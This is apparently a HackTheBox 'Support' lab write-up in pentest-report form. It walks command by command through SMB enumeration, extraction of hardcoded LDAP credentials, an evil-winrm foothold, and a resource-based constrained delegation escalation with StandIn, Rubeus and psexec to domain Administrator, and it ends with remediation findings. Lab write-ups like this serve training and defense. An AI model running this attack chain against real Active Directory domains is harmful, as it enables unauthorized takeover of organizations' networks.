# HTB Support - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-20

---

## 0. Lesson Learned

If you're not seeing expected traffic on Wireshark, change interface from `tun0` to `any`.

If an expected exploit doesn't work, rewrite the command and try again.

---

## 1. Executive Summary

A Windows Active Directory domain controller (SUPPORT.HTB) was compromised through exposed SMB shares containing sensitive binaries. Reverse engineering of an application revealed LDAP credentials, which were used to enumerate the domain and obtain valid user credentials.

Initial access was achieved via WinRM. Privilege escalation was performed using Resource-Based Constrained Delegation (RBCD), allowing impersonation of the Administrator account and full domain compromise.

---

## 2. Scope

- **Target:** 10.129.230.181
- **Domain:** SUPPORT.HTB
- **Environment:** HackTheBox Support (Retired Machine)
- **Testing Window:** 2026-3-19 to 2026-3-20
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.230.181 -T4 -oA support_tcp
```

Exposed services:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135/tcp - RPC
- 139,445/tcp - SMB
- 389,636/tcp - LDAP
- 464/tcp - Kpasswd
- 3268,3269/tcp - Global Catalog
- 5985/tcp - WinRM

This indicates the target is an Active Directory Domain Controller.

---

## 5. Enumeration

SMB shares were enumerated:

```
smbclient -L //10.129.230.181 -N
```

Anonymous SMB access is enabled and exposed a share named `support-tools`.

The share was listed non-interactively revealing a `UserInfo.exe` binary.

```
smbclient //10.129.230.181/support-tools -N -c 'ls'
```

The binary was executed and credentials were observed in Wireshark traffic:

```
mono ./UserInfo.exe -v find -first armando
```

Revealing the following credentials in LDAP traffic:

```
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The credentials were validated:

```
crackmapexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Resulting in valid credentials for the `ldap` account.

These credentials were used to map the domain with Bloodhound:

```
bloodhound-python -d support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.230.181 -c All --zip
```

Revealing a privilege escalation path from `support` to machine account `DC.SUPPORT.HTB` to `CoerceToTGT` to `Administrator`.

The domain was further enumerated with ldap:

```
ldapsearch -H ldap://10.129.230.181 -D 'ldap@support.htb' -b "DC=support,DC=htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(objectClass=person)"
```

Revealing the credentials in the `support` users `Info` field:

```
support : Ironside47pleasure40Watchful
```

Credentials were validated with CME:

```
crackmapexec winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

Resulting in an owned `support` account.

---

## 6. Initial Access

Initial access was achieved with WinRM:

```
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

Resulting in an interactive shell as `support`.

---

## 7. Post-Exploitation

Enumerating groups:

```
whoami /groups
```

Revealed membership in `Shared Support Accounts`, a privileged group enabling delegation attacks highlighed in Bloodhound mapping.

Tools were uploaded with Evil-WinRM for AD exploitation:

```
upload PowerView.ps1

upload StandIn_v13_Net45.exe

upload Rubeus.exe
```

---

## 8. Privilege Escalation

A new machine account was created:

```
.\StandIn_v13_Net45.exe --computer PCname --make
```

The SID of the new machine was listed:

```
Get-ADComputer -Filter * | Select Name, SID
```

The Resource-Based Constrained Delegation was configured:

```
.\StandIn_v13_Net45.exe --computer DC --sid S-1-5-21-1677581083-3380853377-188903654-6101
```

An RC4 hash of the new machine password was generated with Rubeus:

```
.\Rubeus.exe hash /password:MVG2mylRwHkAKUM
```

The `Administrator` account was impersonated with Rubeus s4u module:

```
.\Rubeus.exe s4u /user:PCname /rc4:A1E76894629ED1C03CBCDBC6DCD2AE34 /impersonateuser:Administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt /nowrap
```

Kerberos tickets were listed and saved to the attacker machine:

```
klist
```

On the attacker machine, the ticket was converted and loaded for pass-the-ticket:

```
cat ticket.b64 | base64 -d > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache

export KRB5CCNAME=./ticket.ccache
```

A domain Administrator shell was obtained with PsExec:

```
psexec.py -k -no-pass SUPPORT.HTB/Administrator@DC.SUPPORT.HTB -dc-ip 10.129.230.181
```

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\support\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### Finding: Anonymous SMB Share Exposure

**Severity**: High

**Description**:
Anonymous access to SMB shares allowed retrieval of sensitive binaries.

**Impact**:
Attackers can extract credentials and internal logic from applications.

**Recommendation**:
Disable anonymous SMB access and enforce authentication.

### Finding: Hardcoded Credentials in Application

**Severity**: Critical

**Description**:
The application contained embedded LDAP credentials.

**Impact**:
Attackers can authenticate and enumerate the domain.

**Recommendation**:
Remove hardcoded credentials and use secure credential storage.

### Finding: Weak Access Controls in Active Directory

**Severity**: Critical

**Description**:
Users in "Shared Support Accounts" could perform RBCD attacks.

**Impact**:
Attackers can impersonate domain administrators.

**Recommendation**:
Restrict delegation permissions and review group privileges.

### Finding: Resource-Based Constrained Delegation Abuse

**Severity**: Critical

**Description**:
RBCD allowed privilege escalation to Domain Admin.

**Impact**:
Full domain compromise.

**Recommendation**:
Audit and restrict machine account creation and delegation rights.

---

## 11. Appendix

StandIn - Rule-Based Constrained Delegation Tool -
[https://github.com/FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn)